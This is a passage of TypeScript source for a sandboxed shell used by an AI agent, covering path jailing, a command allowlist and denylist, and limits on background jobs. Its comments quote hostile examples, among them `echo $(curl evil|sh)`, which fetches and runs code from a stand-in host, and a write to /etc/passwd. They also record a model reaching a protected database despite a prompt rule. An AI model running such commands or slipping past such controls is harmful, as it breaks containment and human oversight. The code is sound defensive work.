  node: ['-v', '--version'],
  python: ['-v', '--version'],
  python3: ['-v', '--version'],
  py: ['-v', '--version'],
  java: ['-version', '--version'],
  dotnet: ['--version', '--info', '--list-sdks', '--list-runtimes'],
  tsc: ['--version', '-v'],
  git: ['--version'],
  npm: ['-v', '--version'],
  pnpm: ['-v', '--version'],
};

/** The verdict for one command line: what it is proven to do, and what made that unprovable. */
export interface CommandBoundary {
  /** Every segment is a verb that cannot write, nothing is redirected, nothing is opaque. */
  readOnly: boolean;
  /**
   * `outside` when the text names a path the jail can resolve and refuse; `unknown` when it hid
   * the answer (inline program, substitution, variable); `inside` otherwise.
   */
  where: 'inside' | 'outside' | 'unknown';
  /** The specific finding behind `outside`/`unknown`/`readOnly:false`, for the confirm card. */
  reason: string;
  /** The inline program that made the command opaque, when that is what did it. */
  inline: CodeExecutionOnCommandLine | null;
}

export function classifyCommand(command: string, workspaceRoot: string): CommandBoundary {
  const opaqueReason = opacityReason(command);
  const escape = workspaceEscapeReason(command, workspaceRoot);
  const cdEscape = cdEscapeReason(command, workspaceRoot);

  /*
   * An unterminated quote means this scanner and the shell disagree about where the command ends,
   * so no verdict below it can be believed. `scanShellSyntax` reports it for the allowlist for the
   * same reason; here it collapses both answers to the unprovable one.
   */
  if (scanShellSyntax(command).unterminated) {
    return { readOnly: false, where: 'unknown', reason: '引号未闭合，命令结构无法确定', inline: null };
  }

  let readReason = '';
  for (const segment of scanShellSyntax(command).segments) {
    const verdict = segmentIsReadOnly(segment);
    if (!verdict.ok) { readReason = verdict.reason; break; }
  }
  if (!readReason && hasOutputRedirect(command)) readReason = '命令会写文件（输出重定向）';
  if (!readReason && opaqueReason) readReason = opaqueReason;
  /*
   * `cd` 到工作区外不算"读"。
   *
   * 它的动词在只读表里（它确实不写文件），但它**改变位置**：执行完之后，后续每一条相对路径都已经
   * 不在工作区内了。所以它必须被排除在"阅读类不限制位置"的豁免之外，否则 `cd /d %USERPROFILE% &
   * echo x > y` 会变成一条免审的越界写（第二轮实测 V14 就是这个形状）。
   */
  if (!readReason && cdEscape) readReason = cdEscape;

  return {
    readOnly: readReason === '',
    where: escape ? 'outside' : opaqueReason ? 'unknown' : 'inside',
    // A resolvable escape is the more specific answer, so it outranks "something hid it".
    reason: escape ?? readReason,
    inline: detectInlineCodeExecution(command),
  };
}

/**
 * Why this command's scope cannot be read off its text, or '' when it can.
 *
 * Ordered most-specific first: an inline program is the interesting case even when the string it
 * contains also has a `$` in it, and the disclosure the caller shows should name the interpreter
 * rather than the variable.
 */
function opacityReason(command: string): string {
  const inline = detectInlineCodeExecution(command);
  if (inline) {
    return `程序写在命令行里（${inline.interpreter} ${inline.flag}），`
      + '它读写了什么无法从命令文本判定';
  }
  if (hasCommandSubstitution(command)) {
    return '命令包含 $() 或反引号，里面执行了什么无法从命令文本判定';
  }
  if (/%[A-Za-z_][A-Za-z0-9_]*%/.test(command)) {
    return '命令包含 %VAR% 变量展开，实际路径要等 cmd 展开才知道';
  }
  if (/![A-Za-z_][A-Za-z0-9_]*!/.test(command)) {
    return '命令包含 !VAR! 延迟展开，实际路径要等 cmd 展开才知道';
  }
  if (/\$env:/i.test(command)) {
    return '命令包含 $env: 变量，实际路径要等 PowerShell 展开才知道';
  }
  if (/\$\{/.test(command)) {
    return '命令包含 ${...} 变量展开，实际路径要等 shell 展开才知道';
  }
  if (/\$[A-Za-z_][A-Za-z0-9_]*/.test(command)) {
    return '命令包含 $VAR 变量，实际路径要等 shell 展开才知道';
  }
  /*
   * `for /f "..." %i in (文件) do @type "%i"` —— 路径来自**数据**，不在命令文本里。
   *
   * 这条此前既不是"只读动词"（动词是 `for`），也没有任何一处检查认识它，所以它带着一个完全无法
   * 预判的目标一路跑完了（第二轮实测 V13）。它比 `%VAR%` 更隐蔽：变量至少还写着名字，这里连名字
   * 都没有 —— `p.txt` 今天的内容决定它明天读哪个文件，命令文本本身不构成任何约束。
   *
   * 判不出来的命令按危险那侧走，所以这里只需要认出"存在这种结构"。
   */
  if (/^\s*for\b[^&|]*\bin\s*\(/i.test(command) || /%{1,2}[A-Za-z_~]/i.test(command)) {
    return '命令用 for/变量从数据里取路径，实际目标无法从命令文本判定';
  }
  return '';
}

/**
 * Whether one segment is a proven non-writer.
 *
 * Quoted and stripped before matching so a path-qualified verb (`/usr/bin/git`) reads the same as a
 * bare one, which is the same normalisation `firstCommandToken` applies for the allowlist.
 */
function segmentIsReadOnly(segment: string): { ok: true } | { ok: false; reason: string } {
  const verb = firstCommandToken(segment);
  if (!verb) return { ok: false, reason: '命令为空或程序名无法识别' };

  const args = argTokensAfterVerb(segment, verb);

  // Before the read-only table, because the same verb is a read with one argument and a write
  // with another.
  const writing = WRITING_FLAGS[verb];
  if (writing?.some((f) => args.some((a) => a.toLowerCase() === f || a.toLowerCase().startsWith(`${f}=`)))) {
    return { ok: false, reason: `${verb} 带了会写文件的参数` };
  }

  if (READ_ONLY_VERBS.has(verb)) return { ok: true };

  const subs = READ_ONLY_SUBCOMMANDS[verb];
  if (subs) {
    const sub = args.find((a) => !a.startsWith('-'));
    if (sub && subs.includes(sub.toLowerCase())) return { ok: true };
    return { ok: false, reason: `${verb} ${sub ?? ''}`.trim() + ' 不是只读子命令' };
  }

  const versions = VERSION_FLAGS[verb];
  if (versions) {
    if (args.length > 0 && args.every((a) => versions.includes(a.toLowerCase()))) return { ok: true };
    return { ok: false, reason: `${verb} 不是只读调用` };
  }

  return { ok: false, reason: `${verb} 不在只读命令表内` };
}

/** The arguments of one segment, positioned after the verb (leading `VAR=value` skipped). */
function argTokensAfterVerb(segment: string, verb: string): string[] {
  const tokens = cmdTokens(segment).map(unquoteToken);
  const at = tokens.findIndex((t) => {
    const base = lastPathComponent(t.replace(/[\\/]+$/, ''))
      .toLowerCase()
      .replace(/\.(exe|cmd|bat|com)$/, '');
    return base === verb;
  });
  return at === -1 ? [] : tokens.slice(at + 1);
}

/**
 * Whether any unquoted `>` writes a file.
 *
 * Separate from `scanShellSyntax().redirection`, which is true for `<` as well: reading a file into
 * a program's stdin is a read, and treating it as a write would refuse `sort < list.txt`. `>&` and
 * `2>&1` duplicate a file descriptor rather than naming a file, so they are not writes either.
 */
function hasOutputRedirect(command: string): boolean {
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (quote) {
      if (ch === '\\' && quote === '"') { i++; continue; }
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '\\') { i++; continue; }
    if (ch === '"' || ch === "'") { quote = ch; continue; }
    if (ch !== '>') continue;
    let j = i + 1;
    while (j < command.length && command[j] === '>') j++;
    while (j < command.length && /\s/.test(command[j])) j++;
    if (command[j] === '&') { i = j; continue; }
    return true;
  }
  return false;
}

export function resolveInsideWorkspace(workspaceRoot: string, requestedPath: string): string {
  const root = resolve(workspaceRoot);
  const resolvedPath = resolve(root, requestedPath);

  let rel = relative(root, resolvedPath);
  if (IS_WINDOWS) rel = rel.replace(/\//g, '\\');
  if (rel.startsWith('..') || rel === '..' || (rel && (rel.startsWith(`..${sep}`) || /^[a-zA-Z]:/.test(rel)))) {
    throw new Error(`Path escapes workspace: ${requestedPath}`);
  }

  // Absolute paths that resolved outside via unusual prefixes.
  const normalizedResolved = normalize(resolvedPath);
  const normalizedRoot = normalize(root);
  const cmpResolved = IS_WINDOWS ? normalizedResolved.toLowerCase() : normalizedResolved;
  const cmpRoot = IS_WINDOWS ? normalizedRoot.toLowerCase() : normalizedRoot;
  if (cmpResolved !== cmpRoot && !cmpResolved.startsWith(cmpRoot.endsWith(sep) ? cmpRoot : cmpRoot + sep)) {
    throw new Error(`Path escapes workspace: ${requestedPath}`);
  }

  // Follow symlinks: a link INSIDE the jail can point outside it.
  try {
    const realRoot = realpathSync.native ? realpathSync.native(root) : realpathSync(root);
    let realTarget: string;
    try {
      realTarget = realpathSync.native ? realpathSync.native(resolvedPath) : realpathSync(resolvedPath);
    } catch {
      // Not created yet — resolve its existing parent instead.
      const parent = realpathSync.native
        ? realpathSync.native(dirname(resolvedPath))
        : realpathSync(dirname(resolvedPath));
      realTarget = join(parent, basename(resolvedPath));
    }
    const rr = IS_WINDOWS ? realRoot.toLowerCase() : realRoot;
    const rt = IS_WINDOWS ? realTarget.toLowerCase() : realTarget;
    if (rt !== rr && !rt.startsWith(rr.endsWith(sep) ? rr : rr + sep)) {
      throw new Error(`Path escapes workspace via link: ${requestedPath}`);
    }
  } catch (err) {
    // Re-throw our own containment errors; ignore realpath failures (e.g. a drive that cannot be
    // resolved) rather than crashing the call.
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes('escapes workspace')) throw err;
  }

  return resolvedPath;
}

/**
 * Run a command without handing it to Node's Windows quoting.
 *
 * `spawn(command, { shell: true })` builds `cmd /d /s /c "..."` and cmd strips
 * one layer of quotes. `node -e "a => b"` then sees a bare `>` and silently
 * creates a file. A UTF-16 batch file is not honoured by this cmd either: the
 * BOM is executed as a command name.
 *
 * PowerShell `-EncodedCommand` is UTF-16 and never goes through that parser.
 * The here-string is handed to `cmd /c` as one argument, so quotes stay quotes,
 * and `chcp 65001` makes the console code page UTF-8 for the output.
 */
function spawnCommand(
  command: string,
  cwd: string,
  env: NodeJS.ProcessEnv,
  _workspaceRoot: string,
  isolation?: { plan: IsolationPlan; cwdRel: string } | null,
): ChildProcess {
  /*
   * Layer 4.2: hand the command to a real boundary instead of the host shell.
   *
   * Placed here, at the single spawn both the foreground and background paths go through, so a
   * background job cannot be started unconfined while the foreground is confined — the same
   * single-choke-point argument as `admit()`.
   *
   * The command text reaches the distro base64-encoded and is decoded inside the namespace (see
   * `buildConfinedScript`): it is arbitrary user text, and handing it to a second shell to re-parse
   * is exactly the quoting problem `spawnCommand`'s own doc comment describes for cmd.exe.
   */
  if (isolation) {
    const script = buildConfinedScript({
      workspaceLinux: isolation.plan.workspaceLinux,
      cwdRel: isolation.cwdRel,
      command,
    });
    return spawn('wsl.exe', buildWslArgv(isolation.plan.distro, script), {
      // The HOST cwd, so WSL starts from a directory that exists on both sides; the command itself
      // starts in `cwdRel` inside the namespace, which is what the user asked for.
      cwd: _workspaceRoot,
      env: isolationSpawnEnv(env),
      stdio: ['ignore', 'pipe', 'pipe'],
      windowsHide: true,
    });
  }

  if (!IS_WINDOWS) {
    return spawn(command, {
      shell: true,
      cwd,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
      detached: true,
      windowsHide: true,
    });
  }
  const body = command.replace(/'@/g, "'@'");
  const ps = [
    "$OutputEncoding = [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)",
    'chcp 65001 > $null',
    "cmd.exe /d /c @'",
    body,
    "'@",
    'exit $LASTEXITCODE',
  ].join('\n');
  const encoded = Buffer.from(ps, 'utf16le').toString('base64');
  return spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-EncodedCommand', encoded], {
    cwd,
    env,
    stdio: ['ignore', 'pipe', 'pipe'],
    windowsHide: true,
  });
}

/**
 * Split off a trailing byte sequence that is not yet a complete character.
 *
 * A command's output arrives in arbitrary chunk boundaries, and a chunk boundary can fall in the
 * middle of a UTF-8 sequence — in Chinese output that is every few characters, not a rare edge. The
 * foreground `exec()` never had this problem because it decoded ONCE, after the process exited, when
 * every sequence is complete. A background job is read WHILE it runs, so a naive decode of the bytes
 * collected so far turns a half-received `中` into `�`, and that replacement character is then in
 * the model's context as if the program had printed it.
 *
 * So the tail is held back until the rest of the sequence arrives. Returns `[readable, held]`.
 */
export function splitCompleteUtf8(buf: Buffer): [Buffer, Buffer] {
  for (let back = 1; back <= Math.min(3, buf.length); back++) {
    const b = buf[buf.length - back];
    // A continuation byte (10xxxxxx) belongs to a sequence that started earlier — keep walking back.
    if ((b & 0xc0) === 0x80) continue;
    const need = (b & 0x80) === 0
      ? 1
      : (b & 0xe0) === 0xc0 ? 2 : (b & 0xf0) === 0xe0 ? 3 : 4;
    // The lead byte is inside the tail but its sequence is not complete yet.
    if (need > back) return [buf.subarray(0, buf.length - back), buf.subarray(buf.length - back)];
    return [buf, Buffer.alloc(0)];
  }
  // Every byte examined is a continuation byte: the whole buffer is a fragment.
  return [Buffer.alloc(0), buf];
}

/**
 * How much unread output one job may hold.
 *
 * A background job is read by whoever asked for it, and nothing guarantees anyone ever asks: a model
 * can start a build, get distracted, and never wait on it. An unbounded buffer would then grow with
 * the process's log for as long as the process lives. One megabyte is far more than a reader can use
 * in a turn, and the oldest bytes are the least interesting for a job whose ending is the news.
 */
const JOB_OUTPUT_CAP_BYTES = 1_000_000;

/**
 * The longest a background job may run before the sandbox stops it.
 *
 * Not a budget and not a timeout the model chooses: it exists so a forgotten, hung, or runaway job
 * cannot outlive the session that started it by hours. Thirty minutes is well past any command a
 * turn is built around, and the tool text names the limit so the model can plan around it.
 */
export const JOB_MAX_LIFETIME_MS = 30 * 60_000;

/**
 * How many background jobs one sandbox may have open.
 *
 * Each one is a live process tree, so this is a process-count limit rather than a policy: eight is
 * already more than a turn can keep track of, and a runaway loop that starts a job per iteration is
 * the failure this bound is for.
 */
export const MAX_BACKGROUND_JOBS = 8;

/** How long `shell` waits for a backgrounded command's first output before answering. */
const JOB_FIRST_OUTPUT_MS = 250;

/** How often a blocking `waitJob` reports progress to its caller. */
const JOB_TICK_MS = 5_000;

/** Log tail kept for `pattern` matching, so a line that already scrolled by can still be waited for. */
const JOB_TAIL_BYTES = 16_384;

/**
 * The answer for a job id this sandbox does not know.
 *
 * Worded to be findable: an id from a previous process (a restart, another session) is the common
 * case, and "找不到" is what tells the reader to list the jobs that do exist rather than to retry.
 */
function notFoundJob(id: string): SandboxJobView {
  return {
    found: false,
    id,
    command: '',
    status: 'killed',
    exitCode: null,
    elapsedMs: 0,
    stdout: '',
    stderr: '',
    droppedBytes: 0,
    pendingBytes: 0,
  };
}

function capacityMessage(): string {
  return `后台任务已达上限（${MAX_BACKGROUND_JOBS} 个）：先用 shell_jobs 看还在跑的是哪些，`
    + 'shell_wait 等一个结束或 shell_kill 收掉一个，再启动新的。';
}

/**
 * One child process, foreground or background.
 *
 * The same object serves both. A foreground command is simply one nobody can name yet: if its wait
 * cap is reached with `backgroundOnTimeout`, the object is registered under an id and the caller is
 * answered early — the process is not touched, and no output is lost. Making the two paths share one
 * state is what keeps a promotion from being a different code path than a normal start.
 */
interface Proc {
  id: string;
  command: string;
  child: ChildProcess;
  startedAt: number;
  endedAt: number | null;
  exitCode: number | null;
  status: SandboxJobStatus;
  killedBy?: SandboxJobKillReason;
  /**
   * True once the ROOT process itself has exited.
   *
   * Deliberately distinct from `closed`, which is set by the `close` event and therefore requires the
   * job's stdio pipes to be released as well. A surviving grandchild holds the write end of those
   * pipes, so `close` can be arbitrarily late — or never — while the process a kill is waiting on is
   * long gone. Measured: `shell_kill` took 5.4s on a tree whose root had been dead for seconds,
   * because the confirmation wait keyed on the wrong event.
   */
  exited?: boolean;
  /** The `taskkill /T /F` helper, while it runs. Awaited by `stopAll`/`killJob` so "killed" is a fact. */
  killHelper?: ChildProcess | null;
  /**
   * Set the moment a kill starts; resolves when the whole tree is verified gone.
   *
   * Stored on the process rather than returned to the caller so that every path that kills — the
   * `shell_kill` tool, a foreground timeout, `stopAll`, `dispose` — gets the same teardown, including
   * the sweep. A kill that only some paths verify is a leak that only shows up on the other paths.
   */
  killDone?: Promise<void>;
  out: Buffer[];
  err: Buffer[];
  outBytes: number;
  errBytes: number;
  outTruncated: boolean;
  errTruncated: boolean;
  /** Bytes dropped from the front of the unread output once the cap was reached. */
  droppedBytes: number;
  /** Rolling tail (bytes) used only for `pattern` matching. */
  tail: Buffer[];
  tailBytes: number;
  /** Resolvers of `waitJob` calls currently blocked on this job. */
  waiters: Set<() => void>;
  /** The lifetime cap. Set when the process is registered as a job, not before. */
  lifeTimer: NodeJS.Timeout | null;
  /** Whether the process has already been reported as ended. */
  closed: boolean;
  /** Called once the process ends. Used by `exec` to settle its promise; jobs have none. */
  onEnd?: (ev: { code: number | null; error?: Error }) => void;
  /**
   * Set when the program was on the command line, so the path jail never saw its paths.
   *
   * On the process rather than passed to each caller because it has to survive the jump from a
   * foreground command to a job: a `node -e` that outlived its wait cap must still say so in every
   * view a reader can reach.
   */
  codeExecution?: CodeExecutionOnCommandLine;
  /**
   * The boundary this process runs behind, if any.
   *
   * On the process rather than recomputed per result for the same reason as `codeExecution`: a job
   * outlives the config lookup, and a later `shell_wait` must describe the boundary the process is
   * actually in, not the one the current config would have asked for.
   */
  isolation?: IsolationPlan;
  /**
   * Set when the command text was written in a dialect the shell that ran it does not speak.
   *
   * On the process rather than passed to each caller, for the same reason as `codeExecution`: a
   * command promoted to a background job must still say so in every later `shell_wait`, and the
   * later view has no access to the original `admit()` result.
   */
  shellDialect?: ShellDialectReport;
}

export class SandboxShell {
  private workspaceRoot: string;
  private config: SheConfig['sandbox'];

  /** Background jobs by id, including recently finished ones (their output is still answerable). */
  private jobs = new Map<string, Proc>();
  private jobSeq = 0;

  /*
   * Files that must be reached through a tool, never through raw access.
   *
   * The knowledge base is a live SQLite database with an open connection, and the tool
   * that owns it does more than read bytes: it ranks by resonance and updates access
   * counters. `sqlite3 .she/kb.sqlite "SELECT ..."` was observed in real runs — it skips
   * the ranking, writes nothing back, and holds a second handle on a file the server
   * already has open. A prompt rule alone did not stop it, so the refusal is enforced
   * here, where every path and command must pass.
   */
  private protectedPaths = new Map<string, string>();

  constructor(workspaceRoot: string, config?: Partial<SheConfig['sandbox']>) {
    this.workspaceRoot = resolve(workspaceRoot);
    this.config = {
      shell: config?.shell ?? 'auto',
      timeout: config?.timeout ?? 30_000,
      maxOutputBytes: config?.maxOutputBytes ?? 0,
      denyDestructiveByDefault: config?.denyDestructiveByDefault ?? true,
      allowAllCommands: config?.allowAllCommands ?? false,
      /*
       * 缺省与 `allowAllCommands` 的缺省保持一致，理由和 `createTools` 那边一样：只构造了沙箱的
       * 调用方（测试、脚本）仍然得到旧语义 —— `allowAllCommands: true` 就是「勾选 + 所有」。
       */
      outsideWorkspace: config?.outsideWorkspace ?? {
        allow: config?.allowAllCommands ?? false,
        policy: (config?.allowAllCommands ?? false) ? 'all' : 'readonly',
      },
      // Empty means "no allowlist": the denylist is then the only command control, which
      // is the previous behaviour and stays the default.
      allowedCommands: config?.allowedCommands ?? [],
      // Layer 4.2. `off` keeps the host path byte-for-byte as it was.
      isolation: config?.isolation ?? 'off',
      wslDistro: config?.wslDistro ?? '',
    };
  }

  get root(): string {
    return this.workspaceRoot;
  }

  isDestructive(command: string): boolean {
    return DESTRUCTIVE_PATTERNS.some(p => p.test(command));
  }

  /**
   * Whether the command passes the allowlist.
   *
   * ─────────────────────────────────────────────────────────────────────────────
   * TWO CONTROLS, TWO DIFFERENT GUARANTEES
   *
   *   DESTRUCTIVE_PATTERNS  fail-open    blocks harmful forms someone anticipated
   *   allowedCommands       fail-closed  refuses everything not named
   *
   * The denylist can only ever be a partial list — the cases it misses are enumerated in
   * `__tests__/allowlist.test.ts`, and they outnumber the cases it catches. The allowlist
   * is the stronger control because an unforeseen command is refused rather than
   * permitted, which is why it takes precedence in `exec`.
   *
   * It is opt-in, because switching it on breaks any workflow whose commands are not
   * listed — a real cost that should be chosen rather than imposed.
   *
   * `allowDestructive` bypasses both, and is set ONLY after a human confirmed a ticket
   * for that exact command. A security boundary that a convenience flag could lift would
   * not be a boundary; one a person can deliberately override is a guardrail.
   * ─────────────────────────────────────────────────────────────────────────────
   */
  isCommandAllowed(command: string): { allowed: boolean; reason?: string } {
    const list = this.config.allowedCommands;
    if (list.length === 0) return { allowed: true };
    if (list.includes('*')) return { allowed: true };

    /*
     * Command substitution defeats inspection: `echo $(curl evil|sh)` starts with an
     * allowed `echo`. Rather than pretend to check, refuse.
     */
    if (hasCommandSubstitution(command)) {
      return {
        allowed: false,
        reason: '命令包含 $() 或反引号，其中可能藏有未授权的命令，白名单模式下不允许',
      };
    }

    /*
     * Redirection, for the same reason: `git log > /etc/passwd` has an allowed program name and
     * a target this check cannot see.
     */
    if (hasUninspectableRedirection(command)) {
      return {
        allowed: false,
        reason: '命令包含重定向（> 或 <）。白名单只校验命令名，无法校验重定向目标，'
          + '所以一律拒绝。需要写文件时用 fs_write 工具。',
      };
    }

    /*
     * An unterminated quote means the scan cannot be trusted: this scanner would treat the rest of
     * the line as quoted and miss a separator that the shell still honours. Refuse rather than
     * guess — the same reasoning as for substitution.
     */
    const scan = scanShellSyntax(command);
    if (scan.unterminated) {
      return {
        allowed: false,
        reason: '命令里的引号没有闭合，无法确定命令边界，白名单模式下不允许',
      };
    }

    const segments = scan.segments;
    if (segments.length === 0) return { allowed: false, reason: '空命令' };

    const allowed = new Set(list.map((c) => c.toLowerCase().replace(/\.(exe|cmd|bat|com)$/, '')));
    for (const segment of segments) {
      const token = firstCommandToken(segment);
      if (!token) {
        return { allowed: false, reason: `无法识别命令名: ${segment}` };
      }
      if (!allowed.has(token)) {
        return {
          allowed: false,
          reason: `命令「${token}」不在白名单内（当前允许: ${[...allowed].join(', ')}）。`
            + '这是 fail-closed 设计：没列出来的命令一律拒绝。'
            + '确实需要时把它加进 SHE_ALLOWED_COMMANDS。',
        };
      }
    }
    return { allowed: true };
  }

  /** Config slice this shell was built with, for diagnostics. */
  get sandboxConfig(): SheConfig['sandbox'] {
    return { ...this.config };
  }

  /** Whether an allowlist is in force. */
  get hasCommandAllowlist(): boolean {
    return this.config.allowedCommands.length > 0;
  }

  /**
   * Register a file (and, for a SQLite database, its `-wal` / `-shm` siblings) that the
   * model must not touch with `shell` or `fs_*`.
   *
   * Registering is idempotent by target, so the same database can be protected by more
   * than one caller without depending on the order they run in.
   */
  protectDatabase(dbPath: string, reason: string): void {
    for (const target of [dbPath, `${dbPath}-wal`, `${dbPath}-shm`]) {
      this.protectedPaths.set(canonicalPath(target), reason);
    }
  }

  /**
   * The reason a resolved path is off-limits, or null when it is fine to touch.
   *
   * Comparison is on the canonical path, so a symlink or a differently-spelled route to
   * the same file does not get around it.
   */
  protectedReason(target: string): string | null {
    return this.protectedPaths.get(canonicalPath(target)) ?? null;
  }

  /**
   * The reason a raw command text is off-limits, or null when it is fine to run.
   *
   * This matches the file NAME rather than resolving the path, because a shell command's
   * spelling of a path is not reliably resolvable (`cd`, quoting, `%VAR%`). A command that
   * names the database is already doing what this guard exists to stop, and a false
   * positive here costs the model one clear sentence, while a false negative costs it a
   * second handle on the live database.
   */
  protectedReasonInCommand(command: string): string | null {
    const haystack = command.toLowerCase();
    for (const [target, reason] of this.protectedPaths) {
      const name = basename(target).toLowerCase();
      if (name && haystack.includes(name)) return reason;
    }
    return null;
  }

  /**
   * The reason a requested (possibly relative) path is off-limits, or null.
   *
   * Never throws, so a caller can ask ahead of doing anything — the tool layer uses this to
   * refuse BEFORE the confirmation gate, where a "yes" from the user would otherwise let
   * the write through. A path that escapes the workspace returns null here and is refused
   * by the escape check, which has the better message for that case.
   */
  protectedReasonFor(requestedPath: string): string | null {
    try {
      return this.protectedReason(resolveInsideWorkspace(this.workspaceRoot, requestedPath));
    } catch {
      return null;
    }
  }

  validatePath(requestedPath: string): string {
    const resolvedPath = resolveInsideWorkspace(this.workspaceRoot, requestedPath);
    const reason = this.protectedReason(resolvedPath);
    if (reason) throw new Error(reason);
    return resolvedPath;
  }

  /**
   * Everything that can refuse a command, in one place.
   *
   * Extracted so the background path cannot be a second, more permissive door. Every control in
   * this sandbox is a text-and-argument check, and the only way to keep `shell` (foreground),
   * `shell background:true`, and a job promoted from a timeout equally closed is for all of them to
   * pass through exactly this function. A second copy of these checks would be the first place a
   * future rule gets added to one path only.
   *
   * Returns the denial as a result, or the resolved working directory plus the two limits.
   */
  private admit(
    command: string,
    options?: SandboxOptions,
  ): { denied: SandboxResult } | {
    cwd: string; timeout: number; maxOutput: number; codeExecution?: CodeExecutionOnCommandLine;
  } {
    const deny = (reason: string): { denied: SandboxResult } => ({
      denied: {
        denied: true,
        exitCode: -1,
        stdout: '',
        stderr: `DENIED: ${reason}`,
        timedOut: false,
        durationMs: 0,
      },
    });

    /*
     * Protected files first.
     *
     * Checked ahead of the allowlist and the denylist because it is the most specific
     * answer available: a command that names the knowledge base has exactly one right
     * way to be expressed, and that is not a shell command.
     */
    const protectedInCommand = this.protectedReasonInCommand(command);
    if (protectedInCommand && !options?.allowDestructive) return deny(protectedInCommand);

    /*
     * Allowlist first.
     *
     * Checked before the denylist because it is the stronger control: the denylist can
     * only block patterns someone anticipated, while an allowlist refuses everything not
     * explicitly named. Ordering it first also means the refusal message is the more
     * useful one ("this command is not permitted") rather than a pattern match.
     */
    if (this.hasCommandAllowlist && !options?.allowDestructive) {
      const verdict = this.isCommandAllowed(command);
      if (!verdict.allowed) return deny(verdict.reason ?? '命令不在白名单内');
    }

    if (this.config.denyDestructiveByDefault && this.isDestructive(command) && !options?.allowDestructive) {
      return deny('destructive command blocked by sandbox policy');
    }

    const escape = workspaceEscapeReason(command, this.workspaceRoot);
    if (escape) {
      /*
       * 越界**不等于**拒绝。
       *
       * 这段原来是一句无条件的 `return deny(escape)`，它正是第二轮实测 V17 两个方向的来源：
       * 开「允许所有命令」时字面越界仍然被拒（该放没放），关的时候间接越界一路放行（该问没问）——
       * 因为这是唯一在看的检查，而它只认命令文本里的字面路径。
       *
       * 现在规则只留三条，每条都能自证：
       *
       *   1. 已证明是**只读**命令 → 不拒。用户定的规则是阅读类不限制位置，所以 `cat` 到工作区外
       *      是允许的；硬拦会把"读参考材料"这件正常工作也堵掉。
       *   2. 策略是「所有」→ 不拒。用户明确说了不在乎边界。
       *   3. 其余（只读档 / 拒绝档 / 未勾选）→ 拒。
       *
       * 第 3 条里，"问人"这一步在**上层**（`tools.ts` 的 `boundaryDecision`），因为只有那一层能问；
       * 这里拒的理由是"本层无法取得批准"。人已经批准过的调用带着 `allowDestructive` 回来，于是放行 ——
       * 拒绝档例外：它是真的不许，不提供"批准后放行"这条路。
       */
      const policy = this.config.outsideWorkspace;
      const readOnlyProven = classifyCommand(command, this.workspaceRoot).readOnly;
      const hardDeny = policy.policy === 'deny';
      if (!readOnlyProven && policy.policy !== 'all' && (hardDeny || !options?.boundaryApproved)) {
        return deny(escape);
      }
    }

    /*
     * Nothing refused it, so it runs — and if the program itself was on the command line, the paths
     * it will touch were never inspected. Recorded here, at the single point every command passes
     * (foreground, background, and after a confirm ticket), so no path can run one and stay quiet
     * about it. Deliberately NOT a refusal: see the table above `INLINE_CODE_INTERPRETERS`.
     */
    const codeExecution = detectInlineCodeExecution(command);

    const cwd = options?.cwd ? this.validatePath(options.cwd) : this.workspaceRoot;
    /*
     * Layer 4.2, resolved at the same choke point and for the same reason as the disclosure above:
     * this is the one place foreground, background and post-ticket commands all pass through, so no
     * path can run isolated while another runs unconfined without the difference being recorded.
     *
     * A failure here is a REFUSAL when isolation was explicitly requested — `planIsolation` returns
     * an error only for the `wsl` mode, where silently running on the host would contradict what the
     * result is about to claim.
     */
    const iso = planIsolation(this.config.isolation, this.workspaceRoot, cwd, this.config.wslDistro);
    if (iso && 'error' in iso) return deny(iso.error);

    /*
     * 3a. The dialect of the text against the dialect of the shell that will parse it.
     *
     * Computed here, at the same single choke point as `codeExecution` and the boundary, for the
     * same reason: every command passes through `admit()`, so no path can run a POSIX line under
     * cmd.exe and stay quiet about it. The shell is the one that actually runs — with isolation in
     * effect the text is parsed by `bash -lc` inside the namespace, where POSIX is correct, and
     * reporting a "gap" there would be the false alarm.
     *
     * Only attached when there IS a gap: the shell is named in the tool description up front, and a
     * line repeated on every call is a context cost with no reader.
     */
    const dialect = iso ? 'posix' : this.dialect();
    const gaps = dialect === 'cmd' ? detectShellDialectMismatch(command) : [];
    const shellDialect: ShellDialectReport | null = gaps.length
      ? { shell: iso ? 'bash -lc（WSL 隔离内）' : this.resolveShell(), dialect, gaps }
      : null;

    return {
      cwd,
      timeout: options?.timeout ?? this.config.timeout,
      maxOutput: options?.maxOutputBytes ?? this.config.maxOutputBytes,
      ...(codeExecution ? { codeExecution } : {}),
      ...(iso ? { isolation: iso } : {}),
      ...(shellDialect ? { shellDialect } : {}),
    };
  }

  async exec(command: string, options?: SandboxOptions): Promise<SandboxResult> {
    const admitted = this.admit(command, options);
    if ('denied' in admitted) return admitted.denied;
    const proc = this.spawnProc(command, admitted.cwd, admitted, options);

    return new Promise<SandboxResult>((resolvePromise) => {
      let settled = false;
      const settle = (result: SandboxResult) => {
        if (settled) return;
        settled = true;
        resolvePromise(result);
      };

      const timer = setTimeout(() => {
        /*
         * The wait is over. Whether the WORK is over is a separate question, and it is the one
         * this flag answers.
         *
         * Killing at the cap is right for a caller that wants a bounded answer and never asked
         * for a job: it is what `shell.exec` has always done, and the terminal endpoint and the
         * check scripts depend on it. `backgroundOnTimeout` is the agent's `shell` tool saying
         * "I would rather have this still running than thrown away" — the process is left alone
         * and becomes addressable instead.
         */
        if (options?.backgroundOnTimeout) {
          /*
           * At capacity, the honest move is to stop: the alternative is a process nobody can
           * wait on or kill by name. The caller gets the old foreground answer (timed out, killed)
           * rather than a job id that would not work.
           */
          this.reapJobs();
          if (this.liveJobCount() >= MAX_BACKGROUND_JOBS) {
            this.killProcess(proc, 'timeout');
            setTimeout(() => settle(this.resultOf(proc, true, admitted.maxOutput)), 2_000);
            return;
          }
          const id = this.registerJob(proc);
          /*
           * The output produced so far is handed to the caller AND removed from the job's unread
           * buffer: the same text must not be printed twice (once here, again on the first
           * `shell_wait`). A half-received character is left in the job, where the rest of it will
           * arrive.
           */
          const [safeOut, heldOut] = splitCompleteUtf8(Buffer.concat(proc.out));
          const [safeErr, heldErr] = splitCompleteUtf8(Buffer.concat(proc.err));
          proc.out = heldOut.length ? [heldOut] : [];
          proc.err = heldErr.length ? [heldErr] : [];
